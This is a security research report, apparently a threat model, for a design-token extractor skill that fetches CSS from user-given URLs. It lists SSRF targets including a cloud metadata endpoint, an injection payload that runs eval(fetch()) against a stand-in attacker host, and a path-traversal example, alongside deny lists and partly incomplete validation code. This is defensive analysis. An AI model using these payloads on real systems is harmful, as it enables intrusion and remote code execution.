# Security Research: Design System Extractor Skill (Spec 004)

**Date**: 2026-04-15  
**Researcher**: Security Analysis  
**Status**: Complete  
**Risk Level**: MEDIUM-HIGH (due to untrusted URL fetching + output to project files)

---

## Executive Summary

The design system extractor skill presents **moderate security risks** primarily around:
1. **SSRF vulnerability** if URL validation is insufficient
2. **CSS injection** into extracted output that's written to project files
3. **Data leakage** from private/authenticated sites
4. **Malicious CSS** that could affect the project or developer workflow

This skill should **require explicit user authorization per URL** and implement strict input validation and output sanitization.

---

## 1. URL Handling Risks

### 1.1 SSRF (Server-Side Request Forgery) — HIGH RISK

**Threat**: WebFetch runs in Claude Code's environment. Without validation, attackers could:
- Use the skill as a proxy to scan internal networks (e.g., `http://localhost:8080`, `http://192.168.1.1`)
- Access cloud metadata services (AWS: `http://169.254.169.254/latest/meta-data/`)
- Probe internal services masquerading as "design system extraction"
- Access authenticated internal APIs if credentials are cached

**Current State**: WebFetch documentation indicates it upgrades HTTP to HTTPS and has a cache, but no public documentation on SSRF prevention.

**Recommendation — REQUIRED**:
- ✅ **Deny-list approach (strict)**:
  - Reject `localhost`, `127.0.0.1`, `0.0.0.0`, `::1` (all IPv4/IPv6 loopback)
  - Reject private IP ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16` (link-local), `fc00::/7` (IPv6 ULA)
  - Reject `file://`, `data:`, `javascript:`, `ftp://` protocols
  - **Only allow `https://` (not `http://`)**
- ✅ **Whitelist approach (optional layer)**:
  - If the skill should only extract from known design system CDNs (e.g., Figma, Storybook, GitHub Pages), maintain a whitelist
  - Example: `github.com`, `figma.com`, `storybook.js.org`

**Implementation**:
```javascript
function validateDesignSystemUrl(urlString) {
  try {
    const url = new URL(urlString);
    
    // Protocol check
    if (url.protocol !== 'https:') {
      throw new Error('Only HTTPS URLs are allowed');
    }
    
    // Hostname checks
    const hostname = url.hostname;
    const ip = require('net').isIP(hostname);
    
    if (ip) {
      // Reject all private IPs
      if (!isPublicIP(hostname)) {
        throw new Error('Private IP addresses are not allowed');
      }
    }
    
    // Reject localhost variants
    if (/^(localhost|127\.|::1|0\.0\.)/.test(hostname)) {
      throw new Error('Localhost URLs are not allowed');
    }
    
    return url;
  } catch (err) {
    throw new Error(`Invalid design system URL: ${err.message}`);
  }
}

function isPublicIP(ip) {
  const privateRanges = [
    /^10\./,
    /^172\.(1[6-9]|2[0-9]|3[01])\./,
    /^192\.168\./,
    /^169\.254\./,
    /^fc[0-9a-f]{2}:/i  // IPv6 ULA
  ];
  return !privateRanges.some(range => range.test(ip));
}
```

---

### 1.2 Protocol Restrictions

**Current State**: Skill will receive URLs from users; no documented protocol restrictions in existing code.

**Recommendation — REQUIRED**:
- ✅ **Only accept `https://`**
  - User specifies URL → skill must validate `url.protocol === 'https:'`
  - Reject plain `http://` URLs (upgrade not suitable for untrusted targets)
  - Reject all other protocols (`ftp://`, `file://`, `data:`, `javascript:`)
- ✅ **Document clearly**: "This skill only extracts from HTTPS URLs to prevent man-in-the-middle attacks and unencrypted credential leakage."

---

### 1.3 URL Validation & Canonicalization

**Risk**: Domain spoofing, punycode tricks, path traversal in redirects

**Recommendation — REQUIRED**:
- ✅ **Validate URL structure**:
  - Use `new URL()` to parse (rejects malformed URLs)
  - Canonicalize hostname: `url.hostname.toLowerCase()`
  - Check for suspicious characters (null bytes, unicode tricks)
- ✅ **Redirect handling**:
  - Follow redirects up to 5 redirects max (prevent redirect loops)
  - **Validate each redirect target against the same URL rules** (SSRF can happen mid-chain)
  - Log all redirects to the user

**Example**:
```javascript
async function fetchWithRedirectValidation(urlString) {
  let currentUrl = validateDesignSystemUrl(urlString);
  let redirectCount = 0;
  const maxRedirects = 5;
  
  while (redirectCount < maxRedirects) {
    const response = await fetch(currentUrl);
    
    if ([301, 302, 303, 307, 308].includes(response.status)) {
      const redirectUrl = response.headers.get('location');
      currentUrl = validateDesignSystemUrl(redirectUrl); // Re-validate
      redirectCount++;
      console.log(`Redirect ${redirectCount}: ${redirectUrl}`);
    } else {
      return response;
    }
  }
  
  throw new Error('Too many redirects');
}
```

---

## 2. Content Processing Safety

### 2.1 CSS Parsing & Injection — MEDIUM-HIGH RISK

**Threat**: Malicious CSS in extracted files can:
- Break project builds if syntax is invalid
- Inject expressions (old IE: `-ms-filter: expression()`)
- Use CSS `@import` to load malicious stylesheets from attacker domains
- Exploit CSS to trigger page reloads or XSS in build tools' preview servers
- `-moz-binding` in Firefox (can load remote XBL handlers)
- `behavior: url()` in IE (loads remote `.htc` files)

**Current State**: No CSS parsing library mentioned yet; unclear if sanitization planned.

**Recommendation — REQUIRED**:

1. **Use a CSS parser library** (don't regex CSS):
   ```javascript
   const postcss = require('postcss');
   const css = require('css'); // or postcss
   
   function parseCSSToTokens(cssText) {
     try {
       const parsed = postcss.parse(cssText);
       // Extract only color, font, spacing, shadow values
       // Ignore @imports, @keyframes, malicious constructs
     } catch (err) {
       throw new Error(`Invalid CSS: ${err.message}`);
     }
   }
   ```

2. **Strict token extraction**:
   - Extract only **safe value types**: colors, fonts, sizes, durations
   - Reject `@import`, `@keyframes`, `@media`, `behavior:`, `-moz-binding`, `-ms-filter`
   - Reject URLs in property values (except well-known safe cases like data URIs for gradients)
   - Allow only: hex colors, rgb/rgba, hsl, named CSS functions (calc, var, cubic-bezier), numeric units (px, em, rem, %)

3. **Example safe extraction**:
   ```javascript
   function extractDesignTokens(cssText) {
     const parsed = postcss.parse(cssText);
     const tokens = { colors: {}, fonts: {}, spacing: {}, shadows: {} };
     
     const dangerousPatterns = ['@import', '@keyframes', 'behavior', 'expression', '-moz-binding', '-ms-filter'];
     
     parsed.walkDecls(decl => {
       // Reject dangerous properties
       if (decl.prop.toLowerCase().includes('behavior') || 
           decl.prop.startsWith('-moz') ||
           decl.prop.startsWith('-ms')) {
         console.warn(`Rejecting dangerous property: ${decl.prop}`);
         return;
       }
       
       // Extract color values
       if (['color', 'background', 'border-color', 'fill', 'stroke'].includes(decl.prop)) {
         const color = sanitizeColorValue(decl.value);
         if (color) tokens.colors[decl.prop] = color;
       }
       // ... similarly for fonts, spacing
     });
     
     return tokens;
   }
   
   function sanitizeColorValue(value) {
     // Only allow: hex, rgb, rgba, hsl, hsla, named colors, var()
     const safePat = /^(#[0-9a-f]{3,8}|rgb[a]?\(|hsl[a]?\(|var\(|[a-z]+)$/i;
     return safePat.test(value) ? value : null;
   }
   ```

---

### 2.2 HTML Parsing — MEDIUM RISK

**Threat**: If extracting design tokens from `<meta>`, `<link>`, or inline styles:
- Malicious `<script>` tags in HTML shouldn't be parsed, but vigilance needed
- XSS via event handlers in HTML attributes (e.g., `<div onclick="...">`
- Redirect via `<meta http-equiv="refresh">`

**Recommendation — REQUIRED**:

1. **Only extract CSS, never execute HTML**:
   - Fetch: `.css` files or `<style>` tags in HTML
   - Extract: CSS text only
   - Never eval, parse as JavaScript, or execute HTML

2. **If parsing HTML for `<style>` tags**:
   ```javascript
   function extractStyleTagsFromHTML(htmlText) {
     const dom = new DOMParser().parseFromString(htmlText, 'text/html');
     const styles = [];
     
     dom.querySelectorAll('style').forEach(styleTag => {
       styles.push(styleTag.textContent);
     });
     
     return styles;
   }
   // ✅ Safe: Only reading .textContent, not executing
   ```

3. **Reject frames and scripts**:
   - No `<iframe>`, `<script>`, `<object>`, `<embed>` processing
   - Log if found: "Ignoring embedded script in design system"

---

### 2.3 Output Sanitization — HIGH RISK

**Threat**: Extracted tokens written to project files could contain:
- Unterminated strings that break JS/JSON syntax
- Unicode escapes that execute code
- Comments that comment-out security-critical lines
- Newline injection (CRLF)

**Example attack**:
```css
/* Design token extracted from evil.com */
--color-primary: #FF5733;
--injection: ";alert('xss');//
```

Written to `tokens.js`:
```javascript
const tokens = {
  primary: "#FF5733",
  injection: "";alert('xss');//  // ← Syntax error OR code execution
};
```

**Recommendation — REQUIRED**:

1. **Use JSON for token output** (prevents code injection):
   ```javascript
   const tokens = {
     colors: { primary: "#FF5733" },
     fonts: { body: "Inter, sans-serif" }
   };
   
   fs.writeFileSync('tokens.json', JSON.stringify(tokens, null, 2));
   // ✅ Safe: JSON encoder escapes all strings
   ```

2. **Sanitize all token values before output**:
   ```javascript
   function sanitizeTokenValue(value) {
     // Remove null bytes, control chars, dangerous escapes
     return value
       .replace(/\0/g, '')  // null bytes
       .replace(/[\x00-\x1f]/g, '')  // control chars
       .substring(0, 1000);  // limit length
   }
   ```

3. **Validate JSON before writing**:
   ```javascript
   const tokensJson = JSON.stringify(tokens, null, 2);
   
   try {
     JSON.parse(tokensJson);  // Round-trip validation
     fs.writeFileSync('tokens.json', tokensJson);
   } catch (err) {
     throw new Error('Invalid token output: ' + err.message);
   }
   ```

4. **For JavaScript output** (if needed):
   ```javascript
   // ❌ DON'T: fs.writeFileSync('tokens.js', `const tokens = ${JSON.stringify(tokens)}`);
   
   // ✅ DO: Use template literals safely
   const tokensJson = JSON.stringify(tokens, null, 2);
   const output = `// Design tokens extracted from ${url}\nexport default ${tokensJson};\n`;
   fs.writeFileSync('tokens.js', output);
   ```

---

## 3. Data Privacy & Legal

### 3.1 Public vs Private Site Fetching — HIGH RISK

**Threat**: User could (intentionally or not) extract from:
- Competitors' design systems (copyright infringement)
- Private, authenticated sites (via cached cookies)
- Sites with terms-of-service prohibiting scraping

**Current State**: No guidance on this in existing code.

**Recommendation — REQUIRED**:

1. **Require explicit user authorization**:
   - Skill must ask: **"Extract design tokens from [URL]? This will fetch and parse the site's public CSS."**
   - User must confirm (not auto-accept)
   - Log the URL and timestamp for audit

2. **Cookies & Authentication**:
   - WebFetch should **NOT send cookies** by default
   - If users want to extract from private sites, they must understand the risks
   - Document: "This skill cannot extract from authenticated sites (login-required pages)"
   - OR: If supporting auth, require explicit `--auth` flag with warnings

3. **Robots.txt compliance** — MEDIUM PRIORITY:
   - Check `robots.txt` before fetching
   - If `/css/` is disallowed, warn user: "This site's robots.txt disallows CSS fetching"
   - Respect it unless user explicitly overrides
   ```javascript
   async function checkRobotsTxt(url) {
     const robotsUrl = new URL('/robots.txt', url).toString();
     const robotsText = await fetch(robotsUrl).then(r => r.text());
     const parser = new RobotsParser(robotsUrl, robotsText);
     const allowed = parser.isAllowed(url, 'Claude-Code-DesignExtractor/1.0');
     return allowed;
   }
   ```

4. **User-Agent identification**:
   - Set explicit User-Agent: `Claude-Code-DesignExtractor/1.0`
   - Sites can block or track this agent
   - Respects site owner's choice to opt out

5. **Terms of Service warning**:
   - Documentation must state: "Ensure you have permission to extract from the target site. Some sites prohibit scraping in their ToS."

---

### 3.2 Data Minimization — MEDIUM PRIORITY

**Threat**: Extracting more data than necessary (e.g., all CSS, not just tokens)

**Recommendation**:

1. **Extract only design tokens**:
   - Colors: CSS color properties, CSS variables, color lists
   - Typography: font-family, font-size, font-weight, line-height
   - Spacing: margin, padding, gap, border-radius
   - Shadows: box-shadow
   - Borders: border, border-width, border-radius
   - Animations: transition, animation durations
   - **NOT**: Semantic markup, images, JavaScript, HTML structure, tracking pixels

2. **Never capture**:
   - User tracking pixels / analytics codes
   - Personal data from HTML content
   - API keys in comments
   - Private CSS (e.g., admin-only stylesheets)

---

### 3.3 GDPR & Compliance — MEDIUM PRIORITY

**Risk**: Scraping sites may violate GDPR, CCPA, or terms of service.

**Recommendation**:
- ✅ **Documentation must include**:
  > "This skill extracts design tokens (colors, fonts, spacing) from public CSS only. You are responsible for ensuring you have permission to extract from any site, and that the extraction complies with the site's terms of service, GDPR, CCPA, and other regulations."
- ✅ **Skill usage warning**:
  - Do not extract from sites that prohibit it (check robots.txt, ToS)
  - Do not extract from EU-based sites without confirming GDPR compliance
  - Do not extract tokens that contain or relate to personal data

---

## 4. Rate Limiting & Abuse Prevention

### 4.1 Fetch Limits — MEDIUM PRIORITY

**Threat**: Unlimited CSS fetching could:
- Consume bandwidth
- Trigger rate limits on target site
- Be used to DDoS a site (many Claude Code users extracting simultaneously)

**Recommendation — REQUIRED**:

1. **Per-request limits**:
   - Max file size: 1 MB per CSS file
   - Max CSS files: 10 per extraction session
   - Request timeout: 30 seconds per file

   ```javascript
   async function fetchCSS(url, { maxSize = 1024 * 1024, timeout = 30000 } = {}) {
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), timeout);
     
     try {
       const response = await fetch(url, { signal: controller.signal });
       
       if (response.status !== 200) {
         throw new Error(`HTTP ${response.status}`);
       }
       
       const size = parseInt(response.headers.get('content-length'), 10);
       if (size > maxSize) {
         throw new Error(`File too large: ${size} bytes (max ${maxSize})`);
       }
       
       const css = await response.text();
       if (css.length > maxSize) {
         throw new Error(`Content exceeded max size`);
       }
       
       return css;
     } finally {
       clearTimeout(timeoutId);
     }
   }
   ```

2. **Session-level limits**:
   - Max 10 CSS files per session
   - Max 5 MB total extracted in one session
   - Track and warn: "You've extracted 3 of 10 CSS files this session"

3. **Rate limiting backoff**:
   - If a request fails due to rate limiting (HTTP 429), wait before retrying
   - Implement exponential backoff: wait 1s, then 2s, then 4s
   - Inform user: "Site is rate-limiting requests, waiting before retry..."

---

### 4.2 Robots.txt Compliance — MEDIUM PRIORITY

**Current State**: Not mentioned in prototype skill or spec 004.

**Recommendation**:
- ✅ **Check robots.txt before fetching**:
  - Build a simple robots.txt parser (or use `robots-parser` npm package)
  - If disallowed, warn and ask user for override

---

## 5. Output Safety

### 5.1 File Path Traversal — HIGH RISK

**Threat**: User could specify output like `../../.env` or `/etc/passwd`

**Scenario**:
```
User runs: /extract-tokens https://example.com --output ../../../../credentials.json
Skill writes: /Users/user/DEV/private/ai.to.prototype/../../../../credentials.json
Result: Overwrites /Users/credentials.json (or similar)
```

**Recommendation — REQUIRED**:

1. **Validate output path**:
   ```javascript
   const path = require('path');
   
   function validateOutputPath(outputPath, baseDir = process.cwd()) {
     const resolved = path.resolve(baseDir, outputPath);
     const base = path.resolve(baseDir);
     
     if (!resolved.startsWith(base)) {
       throw new Error('Output path escapes project directory');
     }
     
     return resolved;
   }
   
   // Usage:
   const safePath = validateOutputPath(userProvidedPath, projectRoot);
   fs.writeFileSync(safePath, content);
   ```

2. **Restrict output directory**:
   - Only allow writing to project root or a designated `tokens/` or `design/` subdirectory
   - Default: `design-tokens.json` in project root
   - Warn if user specifies a different path: "Writing tokens to [path]. Files will be overwritten."

3. **File permission checks**:
   - Warn if output file exists and will be overwritten
   - Ask for confirmation before writing to sensitive directories (.env, src/secrets/, etc.)

---

### 5.2 Executable Code in Output — MEDIUM RISK

**Threat**: Malicious CSS → malicious tokens → code injection if tokens used unsafely

**Example**:
```json
{
  "colors": {
    "primary": "#FF5733\"; eval(fetch('https://evil.com/inject.js'))//"
  }
}
```

If a developer does:
```javascript
const { primary } = require('./tokens.json');
eval(`setColor('${primary}')`);  // ← Vulnerable!
```

**Mitigation**:
- ✅ **Output must be safe JSON** (prevents code interpretation)
- ✅ **Document best practices**: "Token values are strings — never eval, interpolate, or execute them."
- ⚠️ **This is a developer responsibility**, but output format should make it obvious

---

## 6. Summary: Security Controls for PRD

### MUST HAVE (Critical)

| Control | Implementation |
|---------|-----------------|
| **URL Validation** | Deny-list private IPs, require HTTPS only, validate against SSRF regex |
| **CSS Parsing** | Use PostCSS or css library, never regex parse |
| **Token Extraction** | Whitelist safe properties (color, font, spacing); reject @import, behavior, -moz-binding, -ms-filter |
| **Output Sanitization** | Use JSON format, validate round-trip, sanitize all values, limit length |
| **File Path Validation** | Prevent `../` traversal, restrict to project root or designated subdirectory |
| **User Confirmation** | Require explicit approval before fetching each URL |
| **Documentation** | Warn about ToS, GDPR, no auth support, rate limiting |

### SHOULD HAVE (Recommended)

| Control | Implementation |
|---------|-----------------|
| **Robots.txt Compliance** | Check and warn if site disallows CSS fetching |
| **Rate Limiting** | Max 1 MB per file, 10 files per session, 30-second timeout |
| **Redirect Validation** | Re-validate each redirect against SSRF rules |
| **User-Agent Header** | Identify as `Claude-Code-DesignExtractor/1.0` |
| **Audit Logging** | Log URL, timestamp, tokens extracted for user review |
| **Content Size Limits** | Reject files > 1 MB, total session > 5 MB |

### NICE TO HAVE (Optional)

| Control | Implementation |
|---------|-----------------|
| **Malicious CSS Detection** | Pattern matching for known attacks (expression, behavior, etc.) |
| **Token Deduplication** | Merge duplicate colors/fonts extracted from multiple files |
| **Design System Templates** | Pre-built extraction rules for Figma, Storybook, known systems |

---

## 7. Risks from Existing Prototype Skill

**Observation**: The prototype skill loads `prototype.min.js` from `https://ai-to-design.com` via Subresource Integrity hash.

**Parallels to Design Extractor**:
- Both fetch external content
- Prototype skill: fetches a *signed script* (SRI protects against tampering)
- Extractor skill: fetches *untrusted CSS* from user-specified URLs

**Different threat model**: The prototype script is trusted (same authors), whereas extracted CSS is untrusted. The extractor skill needs **stricter validation**.

---

## 8. Recommended PRD Additions

1. **Input Validation Section**:
   - HTTPS-only URLs
   - SSRF prevention (deny-list private IPs)
   - Max URL length: 2048 chars
   - Max redirects: 5

2. **Processing Section**:
   - Use PostCSS for parsing
   - Whitelist token properties
   - Reject dangerous CSS constructs
   - JSON output only

3. **Output Section**:
   - File path validation / traversal prevention
   - Max file size: 1 MB
   - JSON format with validation

4. **User Authorization**:
   - Require explicit confirmation per URL
   - Display URL and file size before fetching
   - Show extracted tokens before writing

5. **Legal/Compliance**:
   - User responsible for ToS compliance
   - No auth/cookie support
   - No personal data capture
   - Robots.txt warning

6. **Rate Limits & Abuse Prevention**:
   - Session limits: 10 files, 5 MB total
   - Per-file: 1 MB, 30s timeout
   - User-Agent identification

---

## Conclusion

The design system extractor skill presents **manageable but significant security risks** if proper input validation, content sanitization, and output controls are implemented. The **two critical areas** are:

1. **URL validation** to prevent SSRF
2. **Output sanitization** to prevent code injection when tokens are written to project files

With the controls outlined above, the skill can safely extract design tokens from public, HTTPS-hosted design systems.
